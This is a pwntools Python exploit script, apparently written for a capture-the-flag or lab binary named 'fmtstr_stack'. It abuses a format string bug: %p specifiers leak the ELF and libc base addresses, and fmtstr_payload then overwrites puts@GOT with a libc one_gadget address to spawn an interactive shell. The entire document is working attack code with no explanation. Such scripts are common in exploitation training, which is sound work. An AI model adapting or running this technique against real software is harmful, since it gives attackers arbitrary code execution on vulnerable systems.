#!/usr/bin/env python
from pwn import *

p = process('./fmtstr_stack')
elf = ELF('./fmtstr_stack')
libc_file = "../libc.so.6.md5.5898fac5d2680d0d8fefdadd632b7188"
p = process("./fmtstr_stack", env={'LD_PRELOAD': libc_file})

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

# leaking elf base address and libc base address
# (0x7fffffffe9b8-0x007fffffffe910)/8 = 0x15
"""
fmt = ""
for i in range(0x15, 0x30):
    fmt += "{}, %{}$p\n".format(i, i)
print(fmt)
p.sendafter("reading\n", fmt)
"""
#gdb.attach(p)

p.sendafter("reading\n", "%14$p\n%27$p\n")
p.recvuntil("f\n")
elf_base = p.recvline().decode().strip()
print(elf_base)
elf_base = int(elf_base, 16) - (0x00555555554040-0x00555555554000)
print(hex(elf_base))

libc_base = p.recvline().decode().strip()
print(libc_base)
libc_base = int(libc_base, 16) - (0x00007ffff7df9083-0x00007ffff7dd5000)
print(hex(libc_base))

got_puts = elf_base + elf.got['puts']
one_gadget = libc_base + 0xe3b01

# overwrite puts@got with one_gadget
payload = fmtstr_payload(8, {got_puts: one_gadget}, write_size='byte', numbwritten=0)

p.sendafter("reading\n", payload)

p.interactive()
